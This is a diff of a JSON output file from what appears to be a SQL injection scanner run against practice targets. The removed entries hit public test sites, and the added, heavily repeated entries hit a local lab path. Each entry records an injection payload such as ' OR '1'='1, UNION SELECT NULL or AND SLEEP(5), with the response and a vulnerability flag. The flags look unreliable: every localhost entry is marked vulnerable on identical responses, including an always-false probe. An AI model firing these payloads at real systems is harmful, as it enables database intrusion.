@@ -1,158 +1,242 @@
 [
     {
-        "target": "http://testphp.vulnweb.com/artists.php",
-        "results": [
-            {
-                "payload": "' OR '1'='1",
-                "error": "('Connection aborted.', ConnectionResetError(10054, 'An existing connection was forcibly closed by the remote host', None, 10054, None))",
-                "vulnerable": false
-            },
-            {
-                "payload": "' OR 1=1 --",
-                "error": "('Connection aborted.', ConnectionResetError(10054, 'An existing connection was forcibly closed by the remote host', None, 10054, None))",
-                "vulnerable": false
-            },
-            {
-                "payload": "' UNION SELECT NULL --",
-                "error": "('Connection aborted.', ConnectionResetError(10054, 'An existing connection was forcibly closed by the remote host', None, 10054, None))",
-                "vulnerable": false
-            },
-            {
-                "payload": "' AND SLEEP(5)--",
-                "status_code": 404,
-                "content_length": 153,
-                "snippet": "<html>\r\n<head><title>404 Not Found</title></head>\r\n<body>\r\n<center><h1>404 Not Found</h1></center>\r\n<hr><center>nginx/1.19.0</center>\r\n</body>\r\n</html",
-                "vulnerable": false
-            }
-        ],
-        "vulnerable": false
-    },
-    {
-        "target": "http://testphp.vulnweb.com/artists.php",
-        "results": [
-            {
-                "payload": "' OR '1'='1",
-                "status_code": 404,
-                "content_length": 153,
-                "snippet": "<html>\r\n<head><title>404 Not Found</title></head>\r\n<body>\r\n<center><h1>404 Not Found</h1></center>\r\n<hr><center>nginx/1.19.0</center>\r\n</body>\r\n</html",
-                "vulnerable": false
-            },
-            {
-                "payload": "' OR 1=1 --",
-                "status_code": 404,
-                "content_length": 153,
-                "snippet": "<html>\r\n<head><title>404 Not Found</title></head>\r\n<body>\r\n<center><h1>404 Not Found</h1></center>\r\n<hr><center>nginx/1.19.0</center>\r\n</body>\r\n</html",
-                "vulnerable": false
-            },
-            {
-                "payload": "' UNION SELECT NULL --",
-                "status_code": 404,
-                "content_length": 153,
-                "snippet": "<html>\r\n<head><title>404 Not Found</title></head>\r\n<body>\r\n<center><h1>404 Not Found</h1></center>\r\n<hr><center>nginx/1.19.0</center>\r\n</body>\r\n</html",
-                "vulnerable": false
-            },
-            {
-                "payload": "' AND SLEEP(5)--",
-                "status_code": 404,
-                "content_length": 153,
-                "snippet": "<html>\r\n<head><title>404 Not Found</title></head>\r\n<body>\r\n<center><h1>404 Not Found</h1></center>\r\n<hr><center>nginx/1.19.0</center>\r\n</body>\r\n</html",
-                "vulnerable": false
-            }
-        ],
-        "vulnerable": false
-    },
-    {
-        "target": "http://testphp.vulnweb.com/artists.php?artist=1",
-        "results": [
-            {
-                "payload": "' OR '1'='1",
-                "status_code": 200,
-                "content_length": 2192,
-                "snippet": "<!DOCTYPE HTML PUBLIC \"-//W3C//DTD HTML 4.01 Transitional//EN\"\n\"http://www.w3.org/TR/html4/loose.dtd\">\n<html><!-- InstanceBegin template=\"/Templates/m",
-                "vulnerable": true
-            }
-        ],
+        "target": "http://localhost:8080/vulnerabilities/sqli",
+        "port": 80,
+        "timeout": 5,
+        "payload": "' OR '1'='1",
+        "status_code": 200,
+        "content_length": 1523,
+        "snippet": "\r\n<!DOCTYPE html PUBLIC \"-//W3C//DTD XHTML 1.0 Strict//EN\" \"http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd\">\r\n\r\n<html xmlns=\"http://www.w3.org/1999",
         "vulnerable": true
     },
     {
-        "target": "http://demo.testfire.net/search.jsp?query=1",
-        "results": [
-            {
-                "payload": "' OR '1'='1",
-                "status_code": 200,
-                "content_length": 7025,
-                "snippet": "\r\n\r\n \r\n    \r\n\r\n \r\n\r\n<!-- BEGIN HEADER -->\r\n<!DOCTYPE html PUBLIC \"-//W3C//DTD XHTML 1.0 Transitional//EN\" \"http://www.w3.org/TR/xhtml1/DTD/xhtml1-tran",
-                "vulnerable": false
-            },
-            {
-                "payload": "' OR 1=1 --",
-                "status_code": 200,
-                "content_length": 7025,
-                "snippet": "\r\n\r\n \r\n    \r\n\r\n \r\n\r\n<!-- BEGIN HEADER -->\r\n<!DOCTYPE html PUBLIC \"-//W3C//DTD XHTML 1.0 Transitional//EN\" \"http://www.w3.org/TR/xhtml1/DTD/xhtml1-tran",
-                "vulnerable": false
-            },
-            {
-                "payload": "' UNION SELECT NULL --",
-                "status_code": 200,
-                "content_length": 7036,
-                "snippet": "\r\n\r\n \r\n    \r\n\r\n \r\n\r\n<!-- BEGIN HEADER -->\r\n<!DOCTYPE html PUBLIC \"-//W3C//DTD XHTML 1.0 Transitional//EN\" \"http://www.w3.org/TR/xhtml1/DTD/xhtml1-tran",
-                "vulnerable": false
-            },
-            {
-                "payload": "' AND SLEEP(5)--",
-                "status_code": 200,
-                "content_length": 7030,
-                "snippet": "\r\n\r\n \r\n    \r\n\r\n \r\n\r\n<!-- BEGIN HEADER -->\r\n<!DOCTYPE html PUBLIC \"-//W3C//DTD XHTML 1.0 Transitional//EN\" \"http://www.w3.org/TR/xhtml1/DTD/xhtml1-tran",
-                "vulnerable": false
-            }
-        ],
-        "vulnerable": false
+        "target": "http://localhost:8080/vulnerabilities/sqli",
+        "port": 80,
+        "timeout": 5,
+        "payload": "' OR 1=1 --",
+        "status_code": 200,
+        "content_length": 1523,
+        "snippet": "\r\n<!DOCTYPE html PUBLIC \"-//W3C//DTD XHTML 1.0 Strict//EN\" \"http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd\">\r\n\r\n<html xmlns=\"http://www.w3.org/1999",
+        "vulnerable": true
     },
     {
-        "target": "http://demo.testfire.net/search.jsp?query=",
-        "results": [
-            {
-                "payload": "' OR '1'='1",
-                "status_code": 200,
-                "content_length": 7024,
-                "snippet": "\r\n\r\n \r\n    \r\n\r\n \r\n\r\n<!-- BEGIN HEADER -->\r\n<!DOCTYPE html PUBLIC \"-//W3C//DTD XHTML 1.0 Transitional//EN\" \"http://www.w3.org/TR/xhtml1/DTD/xhtml1-tran",
-                "vulnerable": false
-            },
-            {
-                "payload": "' OR 1=1 --",
-                "status_code": 200,
-                "content_length": 7024,
-                "snippet": "\r\n\r\n \r\n    \r\n\r\n \r\n\r\n<!-- BEGIN HEADER -->\r\n<!DOCTYPE html PUBLIC \"-//W3C//DTD XHTML 1.0 Transitional//EN\" \"http://www.w3.org/TR/xhtml1/DTD/xhtml1-tran",
-                "vulnerable": false
-            },
-            {
-                "payload": "' UNION SELECT NULL --",
-                "status_code": 200,
-                "content_length": 7035,
-                "snippet": "\r\n\r\n \r\n    \r\n\r\n \r\n\r\n<!-- BEGIN HEADER -->\r\n<!DOCTYPE html PUBLIC \"-//W3C//DTD XHTML 1.0 Transitional//EN\" \"http://www.w3.org/TR/xhtml1/DTD/xhtml1-tran",
-                "vulnerable": false
-            },
-            {
-                "payload": "' AND SLEEP(5)--",
-                "status_code": 200,
-                "content_length": 7029,
-                "snippet": "\r\n\r\n \r\n    \r\n\r\n \r\n\r\n<!-- BEGIN HEADER -->\r\n<!DOCTYPE html PUBLIC \"-//W3C//DTD XHTML 1.0 Transitional//EN\" \"http://www.w3.org/TR/xhtml1/DTD/xhtml1-tran",
-                "vulnerable": false
-            }
-        ],
-        "vulnerable": false
+        "target": "http://localhost:8080/vulnerabilities/sqli",
+        "port": 80,
+        "timeout": 5,
+        "payload": "' UNION SELECT NULL --",
+        "status_code": 200,
+        "content_length": 1523,
+        "snippet": "\r\n<!DOCTYPE html PUBLIC \"-//W3C//DTD XHTML 1.0 Strict//EN\" \"http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd\">\r\n\r\n<html xmlns=\"http://www.w3.org/1999",
+        "vulnerable": true
     },
     {
-        "target": "http://testphp.vulnweb.com/artists.php?artist=",
-        "results": [
-            {
-                "payload": "' OR '1'='1",
-                "status_code": 200,
-                "content_length": 2192,
-                "snippet": "<!DOCTYPE HTML PUBLIC \"-//W3C//DTD HTML 4.01 Transitional//EN\"\n\"http://www.w3.org/TR/html4/loose.dtd\">\n<html><!-- InstanceBegin template=\"/Templates/m",
-                "vulnerable": true
-            }
-        ],
+        "target": "http://localhost:8080/vulnerabilities/sqli",
+        "port": 80,
+        "timeout": 5,
+        "payload": "' AND SLEEP(5)--",
+        "status_code": 200,
+        "content_length": 1523,
+        "snippet": "\r\n<!DOCTYPE html PUBLIC \"-//W3C//DTD XHTML 1.0 Strict//EN\" \"http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd\">\r\n\r\n<html xmlns=\"http://www.w3.org/1999",
+        "vulnerable": true
+    },
+    {
+        "target": "http://localhost:8080/vulnerabilities/sqli",
+        "port": 80,
+        "timeout": 5,
+        "payload": "1' OR 1=1#",
+        "status_code": 200,
+        "content_length": 1523,
+        "snippet": "\r\n<!DOCTYPE html PUBLIC \"-//W3C//DTD XHTML 1.0 Strict//EN\" \"http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd\">\r\n\r\n<html xmlns=\"http://www.w3.org/1999",
+        "vulnerable": true
+    },
+    {
+        "target": "http://localhost:8080/vulnerabilities/sqli",
+        "port": 80,
+        "timeout": 5,
+        "payload": "1' AND 1=2#",
+        "status_code": 200,
+        "content_length": 1523,
+        "snippet": "\r\n<!DOCTYPE html PUBLIC \"-//W3C//DTD XHTML 1.0 Strict//EN\" \"http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd\">\r\n\r\n<html xmlns=\"http://www.w3.org/1999",
+        "vulnerable": true
+    },
+    {
+        "target": "http://localhost:8080/vulnerabilities/sqli",
+        "port": 80,
+        "timeout": 5,
+        "payload": "' OR '1'='1",
+        "status_code": 200,
+        "content_length": 1523,
+        "snippet": "\r\n<!DOCTYPE html PUBLIC \"-//W3C//DTD XHTML 1.0 Strict//EN\" \"http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd\">\r\n\r\n<html xmlns=\"http://www.w3.org/1999",
+        "vulnerable": true
+    },
+    {
+        "target": "http://localhost:8080/vulnerabilities/sqli",
+        "port": 80,
+        "timeout": 5,
+        "payload": "' OR 1=1 --",
+        "status_code": 200,
+        "content_length": 1523,
+        "snippet": "\r\n<!DOCTYPE html PUBLIC \"-//W3C//DTD XHTML 1.0 Strict//EN\" \"http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd\">\r\n\r\n<html xmlns=\"http://www.w3.org/1999",
+        "vulnerable": true
+    },
+    {
+        "target": "http://localhost:8080/vulnerabilities/sqli",
+        "port": 80,
+        "timeout": 5,
+        "payload": "' UNION SELECT NULL --",
+        "status_code": 200,
+        "content_length": 1523,
+        "snippet": "\r\n<!DOCTYPE html PUBLIC \"-//W3C//DTD XHTML 1.0 Strict//EN\" \"http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd\">\r\n\r\n<html xmlns=\"http://www.w3.org/1999",
+        "vulnerable": true
+    },
+    {
+        "target": "http://localhost:8080/vulnerabilities/sqli",
+        "port": 80,
+        "timeout": 5,
+        "payload": "' AND SLEEP(5)--",
+        "status_code": 200,
+        "content_length": 1523,
+        "snippet": "\r\n<!DOCTYPE html PUBLIC \"-//W3C//DTD XHTML 1.0 Strict//EN\" \"http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd\">\r\n\r\n<html xmlns=\"http://www.w3.org/1999",
+        "vulnerable": true
+    },
+    {
+        "target": "http://localhost:8080/vulnerabilities/sqli",
+        "port": 80,
+        "timeout": 5,
+        "payload": "1' OR 1=1#",
+        "status_code": 200,
+        "content_length": 1523,
+        "snippet": "\r\n<!DOCTYPE html PUBLIC \"-//W3C//DTD XHTML 1.0 Strict//EN\" \"http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd\">\r\n\r\n<html xmlns=\"http://www.w3.org/1999",
+        "vulnerable": true
+    },
+    {
+        "target": "http://localhost:8080/vulnerabilities/sqli",
+        "port": 80,
+        "timeout": 5,
+        "payload": "1' AND 1=2#",
+        "status_code": 200,
+        "content_length": 1523,
+        "snippet": "\r\n<!DOCTYPE html PUBLIC \"-//W3C//DTD XHTML 1.0 Strict//EN\" \"http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd\">\r\n\r\n<html xmlns=\"http://www.w3.org/1999",
+        "vulnerable": true
+    },
+    {
+        "target": "http://localhost:8080/vulnerabilities/sqli",
+        "port": 80,
+        "timeout": 5,
+        "payload": "' OR '1'='1",
+        "status_code": 200,
+        "content_length": 1523,
+        "snippet": "\r\n<!DOCTYPE html PUBLIC \"-//W3C//DTD XHTML 1.0 Strict//EN\" \"http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd\">\r\n\r\n<html xmlns=\"http://www.w3.org/1999",
+        "vulnerable": true
+    },
+    {
+        "target": "http://localhost:8080/vulnerabilities/sqli",
+        "port": 80,
+        "timeout": 5,
+        "payload": "' OR 1=1 --",
+        "status_code": 200,
+        "content_length": 1523,
+        "snippet": "\r\n<!DOCTYPE html PUBLIC \"-//W3C//DTD XHTML 1.0 Strict//EN\" \"http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd\">\r\n\r\n<html xmlns=\"http://www.w3.org/1999",
+        "vulnerable": true
+    },
+    {
+        "target": "http://localhost:8080/vulnerabilities/sqli",
+        "port": 80,
+        "timeout": 5,
+        "payload": "' UNION SELECT NULL --",
+        "status_code": 200,
+        "content_length": 1523,
+        "snippet": "\r\n<!DOCTYPE html PUBLIC \"-//W3C//DTD XHTML 1.0 Strict//EN\" \"http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd\">\r\n\r\n<html xmlns=\"http://www.w3.org/1999",
+        "vulnerable": true
+    },
+    {
+        "target": "http://localhost:8080/vulnerabilities/sqli",
+        "port": 80,
+        "timeout": 5,
+        "payload": "' AND SLEEP(5)--",
+        "status_code": 200,
+        "content_length": 1523,
+        "snippet": "\r\n<!DOCTYPE html PUBLIC \"-//W3C//DTD XHTML 1.0 Strict//EN\" \"http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd\">\r\n\r\n<html xmlns=\"http://www.w3.org/1999",
+        "vulnerable": true
+    },
+    {
+        "target": "http://localhost:8080/vulnerabilities/sqli",
+        "port": 80,
+        "timeout": 5,
+        "payload": "1' OR 1=1#",
+        "status_code": 200,
+        "content_length": 1523,
+        "snippet": "\r\n<!DOCTYPE html PUBLIC \"-//W3C//DTD XHTML 1.0 Strict//EN\" \"http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd\">\r\n\r\n<html xmlns=\"http://www.w3.org/1999",
+        "vulnerable": true
+    },
+    {
+        "target": "http://localhost:8080/vulnerabilities/sqli",
+        "port": 80,
+        "timeout": 5,
+        "payload": "1' AND 1=2#",
+        "status_code": 200,
+        "content_length": 1523,
+        "snippet": "\r\n<!DOCTYPE html PUBLIC \"-//W3C//DTD XHTML 1.0 Strict//EN\" \"http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd\">\r\n\r\n<html xmlns=\"http://www.w3.org/1999",
+        "vulnerable": true
+    },
+    {
+        "target": "http://localhost:8080/vulnerabilities/sqli",
+        "port": 80,
+        "timeout": 5,
+        "payload": "' OR '1'='1",
+        "status_code": 200,
+        "content_length": 1523,
+        "snippet": "\r\n<!DOCTYPE html PUBLIC \"-//W3C//DTD XHTML 1.0 Strict//EN\" \"http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd\">\r\n\r\n<html xmlns=\"http://www.w3.org/1999",
+        "vulnerable": true
+    },
+    {
+        "target": "http://localhost:8080/vulnerabilities/sqli",
+        "port": 80,
+        "timeout": 5,
+        "payload": "' OR 1=1 --",
+        "status_code": 200,
+        "content_length": 1523,
+        "snippet": "\r\n<!DOCTYPE html PUBLIC \"-//W3C//DTD XHTML 1.0 Strict//EN\" \"http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd\">\r\n\r\n<html xmlns=\"http://www.w3.org/1999",
+        "vulnerable": true
+    },
+    {
+        "target": "http://localhost:8080/vulnerabilities/sqli",
+        "port": 80,
+        "timeout": 5,
+        "payload": "' UNION SELECT NULL --",
+        "status_code": 200,
+        "content_length": 1523,
+        "snippet": "\r\n<!DOCTYPE html PUBLIC \"-//W3C//DTD XHTML 1.0 Strict//EN\" \"http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd\">\r\n\r\n<html xmlns=\"http://www.w3.org/1999",
+        "vulnerable": true
+    },
+    {
+        "target": "http://localhost:8080/vulnerabilities/sqli",
+        "port": 80,
+        "timeout": 5,
+        "payload": "' AND SLEEP(5)--",
+        "status_code": 200,
+        "content_length": 1523,
+        "snippet": "\r\n<!DOCTYPE html PUBLIC \"-//W3C//DTD XHTML 1.0 Strict//EN\" \"http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd\">\r\n\r\n<html xmlns=\"http://www.w3.org/1999",
+        "vulnerable": true
+    },
+    {
+        "target": "http://localhost:8080/vulnerabilities/sqli",
+        "port": 80,
+        "timeout": 5,
+        "payload": "1' OR 1=1#",
+        "status_code": 200,
+        "content_length": 1523,
+        "snippet": "\r\n<!DOCTYPE html PUBLIC \"-//W3C//DTD XHTML 1.0 Strict//EN\" \"http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd\">\r\n\r\n<html xmlns=\"http://www.w3.org/1999",
+        "vulnerable": true
+    },
+    {
+        "target": "http://localhost:8080/vulnerabilities/sqli",
+        "port": 80,
+        "timeout": 5,
+        "payload": "1' AND 1=2#",
+        "status_code": 200,
+        "content_length": 1523,
+        "snippet": "\r\n<!DOCTYPE html PUBLIC \"-//W3C//DTD XHTML 1.0 Strict//EN\" \"http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd\">\r\n\r\n<html xmlns=\"http://www.w3.org/1999",
         "vulnerable": true
     }
 ]
